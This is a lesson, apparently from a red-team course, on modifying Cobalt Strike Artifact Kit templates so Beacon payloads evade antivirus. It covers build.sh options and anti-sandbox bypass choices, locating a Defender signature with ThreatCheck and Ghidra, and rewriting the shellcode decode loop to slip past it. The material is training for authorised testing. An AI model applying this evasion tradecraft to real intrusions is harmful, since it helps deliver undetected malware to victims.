
Cobalt Strike contains a collection of stage0 templates that form the basis of the `.exe`, `.svc.exe`, and `.dll` payloads.  The Cobalt Strike client is packaged with a set of default templates that are named after their purpose and architecture.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/8e30261f6ab2dbdf93496144203702c2.png)

- '32' are 32-bit templates (and '64' are 64-bit).
    
- 'big' are the stageless templates (otherwise staged is implied).
    
- 'svc' are the service binary templates.

When a payload is generated by the operator, Cobalt Strike takes the Beacon DLL and performs tasks such as patching the listener configuration into it.  The DLL is then prepended with its reflective loader stub and transformed into a shellcode package.  That shellcode is then patched into one of these templates depending on what type of payload the operator asked for.  The templates themselves are nothing more than shellcode injectors - their only role is to take that Beacon shellcode, inject it into memory, and execute it.

These payload artifacts are a prime target for anti-virus vendors because they are usually dropped to disk, and will usually be the same across multiple CS deployments unless specifically changed by the operator (or if the CS developers happen to change them).

The artifact kit contains the source code for these templates, which gives operators access to modify parts that may be signatured by an anti-virus vendor.

![[Pasted image 20250727223305.png]]

The layout of the kit can be overwhelming if you're not all that fluent in C.

In `src-main` you will find `main.c` and `dllmain.c`, which are the entry points for the `.exe` and `.dll` templates respectively.

In `src-common`, there are multiple `bypass-*.c` files.  These are anti-sandbox techniques and you can choose one of these to build into your template.  The `README.md` file contains an explanation about how each one works, and you can even add your own if you wish.  The technique used by the default built-in templates is `dist-readfile`.

`patch.c` contains most of the main logic for performing the shellcode injection, with `injector.c` and `start_thread.c` containing some helper functions.

To build a new set of templates, run `build.sh`.  The syntax is: 
```bash
./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
```

- Techniques is a space separated list of bypass templates that you want to build.
    
- Allocator sets which API is used to allocate memory for the shellcode.  The default options are HeapAlloc, VirtualAlloc, and MapViewOfFile.
    
- Stage Size is used to set the space needed for the beacon shellcode.  Unless you're using a custom reflective loader, leave this at the default value.
    
- RDLL Size is used to specify validate the RDLL size.  Again, when not using a custom reflective loader, keep this set to 0.
    
- When set to true, the Resource File is used to change properties of the artifact, such as the CompanyName, FileDescription, ProductName, etc.  This information is defined in `src-main/resource.rc`.
    
- When set to true, Stack Spoof enables a stack spoofing technique to hide the fact the shellcode is executing from an unbacked region of memory.
    
- Syscalls sets the system call method.  Options are none, embedded, indirect, and indirect_randomized.
    
- Output Directory is the directory to save the generated artifacts.

> For the purposes of this course, we're going to ignore options like stack spoofing and syscalls because they're not necessary for basic anti-virus evasion. In fact, adding syscalls at this stage will actually add more detections.

Let's build a set of artifacts using the mailslot bypass template.

```powershell
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 344564
[Artifact kit] [*] Using RDLL size: 0K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: mailslot
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-mailslot.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-mailslot.c
[Artifact kit] [+] The artifacts for the bypass technique 'mailslot' are saved in '/mnt/c/Tools/cobaltstrike/custom-artifacts/mailslot'
```

>The stage size tends to vary between CS releases as features get added or removed from Beacon.  Always run build.sh without arguments first to see what the minimum stage sizes are.

This will output a new set of artifacts and an Aggressor script called `artifact.cna`.

```powershell
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> ls

    Directory: C:\Tools\cobaltstrike\custom-artifacts\mailslot

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        19/03/2025     11:04          12045 artifact.cna
-a----        19/03/2025     11:03          38400 artifact32.dll
-a----        19/03/2025     11:03          40448 artifact32.exe
-a----        19/03/2025     11:03         409600 artifact32big.dll
-a----        19/03/2025     11:03         411648 artifact32big.exe
-a----        19/03/2025     11:03          42496 artifact32svc.exe
-a----        19/03/2025     11:03         413696 artifact32svcbig.exe
-a----        19/03/2025     11:03          41472 artifact64.exe
-a----        19/03/2025     11:03          39936 artifact64.x64.dll
-a----        19/03/2025     11:04         413184 artifact64big.exe
-a----        19/03/2025     11:03         411648 artifact64big.x64.dll
-a----        19/03/2025     11:03          43520 artifact64svc.exe
-a----        19/03/2025     11:04         415232 artifact64svcbig.exe
```

Before plugging these new templates into Cobalt Strike, it's useful to know how well they'll stand up against an anti-virus before any weaponised shellcode is patched into them.  I really recommend against uploading them to a resource like VirusTotal because you're just giving away your artifacts.  Instead, test them in a sandbox you control.  For example, [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) can analyse a binary by splitting it into little pieces and scanning them with Defender to identify the smallest possible chunk that is detected as malicious.

In this example, I'm scanning `artifact64big.exe` which is the template for the stageless 64-bit payload.

```powershell
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
[+] Target file size: 413184 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x9CE
000008CE   00 00 48 83 EC 28 48 8B  05 65 33 06 00 C7 00 01   ..H.ì(H..e3..Ç..
000008DE   00 00 00 E8 AA FC FF FF  90 90 48 83 C4 28 C3 0F   ...èªüÿÿ..H.Ä(A.
000008EE   1F 00 48 83 EC 28 48 8B  05 45 33 06 00 C7 00 00   ..H.ì(H..E3..Ç..
000008FE   00 00 00 E8 8A FC FF FF  90 90 48 83 C4 28 C3 0F   ...è.üÿÿ..H.Ä(A.
0000090E   1F 00 48 83 EC 28 E8 B7  60 00 00 48 85 C0 0F 94   ..H.ì(è·`..H.A..
0000091E   C0 0F B6 C0 F7 D8 48 83  C4 28 C3 90 90 90 90 90   A.A÷OH.Ä(A.....
0000092E   90 90 48 8D 0D 09 00 00  00 E9 D4 FF FF FF 0F 1F   ..H......éOÿÿÿ..
0000093E   40 00 C3 90 90 90 90 90  90 90 90 90 90 90 90 90   @.A.............
0000094E   90 90 48 FF E1 48 63 05  D6 6A 00 00 85 C0 7E 26   ..HÿáHc.Öj...A~&
0000095E   83 3D CF 6A 00 00 00 7E  1D 48 8B 15 06 6D 06 00   .=Ij...~.H...m..
0000096E   48 89 14 01 48 8B 15 03  6D 06 00 48 63 05 B4 6A   H...H...m..Hc.'j
0000097E   00 00 48 89 14 01 C3 41  54 55 57 56 53 48 83 EC   ..H...AATUWVSH.ì
0000098E   40 41 B9 04 00 00 00 4C  63 E2 48 89 CF 4C 89 C5   @A1....LcâH.IL.Å
0000099E   31 C9 41 B8 00 30 00 00  4C 89 E2 4C 89 E6 FF 15   1ÉA,.0..L.âL.æÿ.
000009AE   22 6D 06 00 48 89 C3 31  C0 39 C6 7E 15 48 89 C2   "m..H.A1A9Æ~.H.A
000009BE   83 E2 07 8A 54 15 00 32  14 07 88 14 03 48 FF C0   .â..T..2.....HÿA
[*] Run time: 10.93s
```

Here, ThreatCheck has identified a block of code that Defender doesn't like, located at an offset of **0x9CE**.  For us mere mortals who can't speak assembly, it's more accessible to load the artifact into a tool like [Ghidra](https://github.com/NationalSecurityAgency/ghidra) and use its search and disassembly features.

Use `ghidraRun.bat` to launch Ghidra, then go to **File > New Project**.  Select a non-shared project, set the project directory (anywhere is fine), and give the project a name.

![[Pasted image 20250727223857.png]]

Next, add the artifact to the project by going to **File > Import File** and selecting `C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe`.  When the dragon has finished munching on the 1's and 0's, close the result summary and you will see the artifact has been added.

![[Pasted image 20250727223919.png]]

Next, simply double-click on the artifact filename in the project and it will open in the **CodeBrowser**.  The first time it's opened, you'll be asked if you want to analyse it.  Click **Yes**.

In the next window, leave the selected analysers as default and click the **Analyze** button.  Once complete, you should see the assembly code on the left and the corresponding decompilation on the right.

To find the offending code that ThreatCheck identified, we can use ghidra to jump to the given offset.  Select **Navigation > Go To** and enter `file(0x9ce)` (or whatever offset ThreatCheck gave), and click **OK**.  This will jump us to an 'unknown' function called `FUN_140001585`.  To narrow down the search a bit more, we can go back to ThreatCheck's output and start looking for specific byte sequences that it reported.  In this particular example, the last line of output were the hex values `83 E2 07 8A 54 15 00 32 14 07 88 14 03 48 FF C0`, and we can match these exactly in Ghidra.

Highlighting these bytes in the assembly (on the left) will also highlight the corresponding lines in the decompilation (on the right).

![[Pasted image 20250727224045.png]]

Now we can see that this byte sequence relates to a `for` loop.

The next step is to go back to the artifact source code and find where this loop exists.  We can clearly see its within a function that takes three parameters, and contains calls to VirtualProtect and CreateThread.  This turns out to be the `spawn` function in `patch.c`, and based on the comments, is responsible for decoding the shellcode and copying it into memory.  The loop itself is on lines 115-117.

![[Pasted image 20250727224121.png]]

The strategy to bypass this detection is to modify the loop so that it compiles to different machine (assembly) code.  Note that simply changing variable names is not sufficient in these compiled languages because the original names are not typically retained in release builds.

A cheeky way to rework this is to replace it with a backwards `while` loop.

```powershell
/* keep old code increase we break something and need to roll back
for (int x = 0; x < length; x++) {
   *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
} */

/* decode the payload with the key */
int x = length;
while(x--) {
   *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

This still compiles to a for loop but it's structured differently and therefore compiles to different machine code that does not match the previous signature.

After running the build script again, we'll see that the template is no longer detected as malicious

```powershell
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
[+] No threat found!
[*] Run time: 0.34s
```

The final step is to hook these new templates into Cobalt Strike.  In the client, go to **Cobalt Strike > Script Manager**, click **Load**, then select `C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna`.  You can then generate new payloads (e.g. **Payloads > Windows Stageless Payload**) and these new templates will be used.

> Always test new payloads on your machine before deploying them on a target.  This way, you'll know if you did anything to accidently break them.

This example only covered the regular executable but there is also the DLL and service executable payloads to consider.  Following the same methodology will allow you to bypass any detections that are related to the artifact's source code.